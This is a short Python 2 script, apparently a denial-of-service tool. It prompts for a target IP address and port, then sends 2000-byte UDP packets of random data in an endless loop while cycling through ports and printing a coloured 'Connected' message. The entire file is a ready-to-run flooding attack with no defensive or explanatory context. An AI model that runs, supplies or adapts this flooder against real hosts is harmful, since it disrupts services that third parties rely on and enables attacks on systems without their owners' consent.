import sys
import os
import time
import socket
import random

#SOCKET
connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)

ip = raw_input("IP ADDRESS: ")
port = input("PORT : ")

os.system("clear")
sent = 0

while True:
     connect.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[0;31mConnected --> \033[0;32m%s"%(ip)
     time.sleep(2)
     if port == 65534:
       port = 1
